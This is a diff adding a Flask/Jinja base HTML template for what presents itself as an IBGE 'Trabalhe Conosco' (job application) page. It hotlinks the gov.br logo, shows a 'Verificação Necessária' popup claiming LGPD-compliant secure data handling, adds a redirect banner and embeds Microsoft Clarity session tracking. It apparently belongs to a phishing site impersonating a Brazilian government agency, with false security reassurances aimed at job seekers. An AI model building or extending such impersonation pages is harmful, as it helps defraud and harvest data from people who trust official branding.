@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>{% block title %}Trabalhe Conosco - IBGE{% endblock %}</title>
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <link href="{{ url_for('static', filename='css/style.css') }}" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Rawline', sans-serif;
+            font-size: 14px;
+        }
+        .custom-shadow {
+            box-shadow: 0 2px 8px 0 rgba(0,0,0,0.08);
+        }
+        .header-menu {
+            font-size: 0.6875rem !important; /* 11px */
+            letter-spacing: 0.025em;
+            font-weight: 400;
+        }
+        .header-small {
+            font-size: 0.75rem !important; /* 12px */
+        }
+        .accordion-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease-out;
+        }
+        .accordion-content.active {
+            max-height: 500px;
+            transition: max-height 0.3s ease-in;
+        }
+        .chevron-rotate {
+            transform: rotate(180deg);
+            transition: transform 0.3s ease;
+        }
+        /* Otimização de imagens */
+        img {
+            image-rendering: optimizeQuality;
+            image-rendering: -webkit-optimize-contrast;
+        }
+        /* Preload crítico */
+        .critical-image {
+            content-visibility: auto;
+        }
+    </style>
+</head>
+<body class="bg-white min-h-screen text-sm">
+    {% block content %}{% endblock %}
+    
+    <!-- Popup de Carregamento -->
+    <div id="loading-popup" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden flex items-center justify-center">
+        <div class="bg-white rounded-lg p-8 mx-4 max-w-sm w-full text-center">
+            <img src="https://barra.sistema.gov.br/v1/assets/govbr.webp" alt="gov.br" class="h-12 mx-auto mb-6" loading="lazy">
+            
+            <div class="flex justify-center mb-4">
+                <div class="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
+            </div>
+            
+            <div id="loading-text" class="text-gray-800 font-medium mb-4">Verificação Necessária</div>
+            
+            <p class="text-xs text-gray-600 leading-relaxed">
+                Criando ambiente seguro e protegendo dados de acordo com a lei LGPD.
+            </p>
+        </div>
+    </div>
+    
+    <!-- Popup de Redirecionamento -->
+    <div id="redirect-popup" class="fixed top-0 left-0 right-0 bg-blue-600 text-white p-3 z-50 hidden">
+        <div class="flex items-center justify-center">
+            <div class="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-3"></div>
+            <span class="text-sm font-medium">Redirecionando...</span>
+        </div>
+    </div>
+    
+    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
+    
+    <!-- Microsoft Clarity -->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "s53xt1d97u");
+    </script>
+</body>
+</html>
